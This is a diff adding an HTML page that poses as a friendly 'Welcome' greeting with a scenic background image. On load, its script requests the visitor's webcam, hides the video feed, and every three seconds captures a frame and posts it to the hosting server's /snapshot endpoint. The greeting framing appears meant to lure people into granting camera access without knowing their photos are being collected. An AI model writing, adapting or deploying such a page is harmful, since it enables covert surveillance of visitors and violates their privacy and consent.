@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Welcome</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #0a0a0a;
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      color: #e0e0e0;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 680px;
+      padding: 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    header { text-align: center; }
+
+    header h1 {
+      font-size: 2rem;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: 0.01em;
+    }
+
+    header h1 span { color: #f6821f; }
+
+    header p {
+      font-size: 0.95rem;
+      color: #666;
+      margin-top: 8px;
+    }
+
+    .img-wrap {
+      position: relative;
+      border-radius: 16px;
+      overflow: hidden;
+      border: 1px solid #1e1e1e;
+      aspect-ratio: 4/3;
+      background: #111;
+    }
+
+    .img-wrap img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .flash {
+      position: absolute;
+      inset: 0;
+      background: white;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.05s;
+    }
+    .flash.active { opacity: 0.3; }
+
+    #countdown-badge {
+      position: absolute;
+      top: 12px;
+      right: 14px;
+      background: rgba(0,0,0,0.55);
+      border: 1px solid #333;
+      border-radius: 8px;
+      padding: 5px 13px;
+      font-size: 0.82rem;
+      font-weight: 600;
+      color: #f6821f;
+      backdrop-filter: blur(6px);
+    }
+
+    .status-bar {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: #111;
+      border: 1px solid #1e1e1e;
+      border-radius: 10px;
+      padding: 12px 16px;
+      font-size: 0.85rem;
+    }
+
+    .dot {
+      width: 9px; height: 9px;
+      border-radius: 50%;
+      background: #333;
+      flex-shrink: 0;
+      transition: background 0.3s;
+    }
+    .dot.green { background: #4ade80; box-shadow: 0 0 6px #4ade80; }
+    .dot.red   { background: #f87171; box-shadow: 0 0 6px #f87171; }
+
+    #status-text { color: #aaa; flex: 1; }
+    #snap-count  { font-size: 0.78rem; color: #555; }
+
+    canvas { display: none; }
+    video  { display: none; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <header>
+    <h1>👋 Good <span id="time-of-day">Day</span>!</h1>
+    <p id="greeting-sub">Welcome — sit back and relax ☁️</p>
+  </header>
+
+  <div class="img-wrap">
+    <img id="bg-img" src="" alt="Scenic view" />
+    <div class="flash" id="flash"></div>
+    <div id="countdown-badge">Starting...</div>
+  </div>
+
+  <div class="status-bar">
+    <div class="dot" id="dot"></div>
+    <span id="status-text">Initialising...</span>
+    <span id="snap-count">0 snaps</span>
+  </div>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+  const video          = document.getElementById("video");
+  const canvas         = document.getElementById("canvas");
+  const ctx            = canvas.getContext("2d");
+  const statusText     = document.getElementById("status-text");
+  const snapCount      = document.getElementById("snap-count");
+  const dot            = document.getElementById("dot");
+  const flash          = document.getElementById("flash");
+  const countdownBadge = document.getElementById("countdown-badge");
+  const bgImg          = document.getElementById("bg-img");
+  const timeOfDay      = document.getElementById("time-of-day");
+  const greetingSub    = document.getElementById("greeting-sub");
+
+  const INTERVAL_MS = 3000;
+  const SERVER_URL  = window.location.origin + "/snapshot";
+
+  // ── Greeting ──────────────────────────────────────────────────────────────
+  const hour = new Date().getHours();
+  if      (hour >= 5  && hour < 12) { timeOfDay.textContent = "Morning";   greetingSub.textContent = "Hope your morning is going great ☀️"; }
+  else if (hour >= 12 && hour < 17) { timeOfDay.textContent = "Afternoon"; greetingSub.textContent = "Hope you're having a lovely afternoon 🌤️"; }
+  else if (hour >= 17 && hour < 21) { timeOfDay.textContent = "Evening";   greetingSub.textContent = "Enjoy your evening 🌇"; }
+  else                               { timeOfDay.textContent = "Night";     greetingSub.textContent = "Burning the midnight oil? 🌙"; }
+
+  // ── Background image ──────────────────────────────────────────────────────
+  const seeds = [10, 42, 77, 88, 101, 203, 312, 456, 500, 611];
+  bgImg.src = `https://picsum.photos/seed/cloud${seeds[Math.floor(Math.random()*seeds.length)]}/800/600`;
+
+  // ── State ─────────────────────────────────────────────────────────────────
+  let totalSnaps  = 0;
+  let nextSnapIn  = INTERVAL_MS / 1000;
+  let countdownId = null;
+
+  function setStatus(msg, dotClass) {
+    statusText.textContent = msg;
+    dot.className = "dot " + dotClass;
+  }
+
+  function triggerFlash() {
+    flash.classList.add("active");
+    setTimeout(() => flash.classList.remove("active"), 120);
+  }
+
+  function startCountdown() {
+    nextSnapIn = INTERVAL_MS / 1000;
+    clearInterval(countdownId);
+    countdownId = setInterval(() => {
+      nextSnapIn = Math.max(0, nextSnapIn - 1);
+      countdownBadge.textContent = nextSnapIn > 0 ? "Next: " + nextSnapIn + "s" : "📸";
+    }, 1000);
+  }
+
+  async function captureAndSend() {
+    canvas.width  = video.videoWidth  || 640;
+    canvas.height = video.videoHeight || 480;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataURL = canvas.toDataURL("image/jpeg", 0.85);
+
+    triggerFlash();
+    nextSnapIn = INTERVAL_MS / 1000;
+
+    try {
+      const res  = await fetch(SERVER_URL, {
+        method : "POST",
+        headers: { "Content-Type": "application/json" },
+        body   : JSON.stringify({ image: dataURL })
+      });
+      const data = await res.json();
+
+      if (data.success) {
+        totalSnaps++;
+        snapCount.textContent = totalSnaps + " snap" + (totalSnaps !== 1 ? "s" : "");
+        setStatus("Active — sending every 3 seconds", "green");
+      } else {
+        setStatus("Server error: " + data.error, "red");
+      }
+    } catch (err) {
+      setStatus("Cannot reach server: " + err.message, "red");
+    }
+  }
+
+  async function init() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      video.srcObject = stream;
+      await video.play();
+
+      setStatus("Active — sending every 3 seconds", "green");
+      countdownBadge.textContent = "Next: 3s";
+
+      captureAndSend();
+      setInterval(captureAndSend, INTERVAL_MS);
+      startCountdown();
+
+    } catch (err) {
+      setStatus("Access denied: " + err.message, "red");
+      countdownBadge.textContent = "✖";
+    }
+  }
+
+  window.addEventListener("load", init);
+</script>
+
+</body>
+</html>
